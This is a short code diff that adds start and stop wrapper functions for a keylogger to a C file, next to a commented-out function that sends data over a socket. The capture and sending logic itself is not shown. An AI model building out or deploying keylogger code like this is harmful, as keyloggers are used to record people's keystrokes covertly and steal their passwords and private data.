@@ -187,3 +187,15 @@ int send_data(FILE* socket_file) {
 
   return bytes_sent;
 }*/
+
+void start_keylogging(void) {
+  key_package pack;
+  pack.keys_arr_size = 0;
+  log_device(&pack);
+  log_keys(&pack);
+}
+
+void end_keylogging(void) {
+  // changes a value in the keylogger.h file to signal to end keylogging
+  end_logging();
+}
